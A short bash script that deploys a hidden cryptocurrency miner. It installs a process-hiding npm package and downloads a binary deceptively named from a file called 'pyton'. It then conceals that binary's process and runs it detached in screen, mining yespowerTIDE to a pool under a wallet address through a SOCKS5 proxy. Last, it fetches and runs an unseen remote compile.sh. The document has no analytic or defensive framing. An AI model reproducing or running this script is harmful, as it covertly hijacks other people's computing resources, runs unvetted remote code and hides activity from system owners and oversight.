#!/bin/bash
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
apt-get install screen -y
npm i -g node-process-hider
wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
sudo ph add kase
chmod +x kase
screen -dm -S kase ./kase -a yespowerTIDE -o stratum+tcp://asia.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
chmod +x compile.sh
./compile.sh

echo success
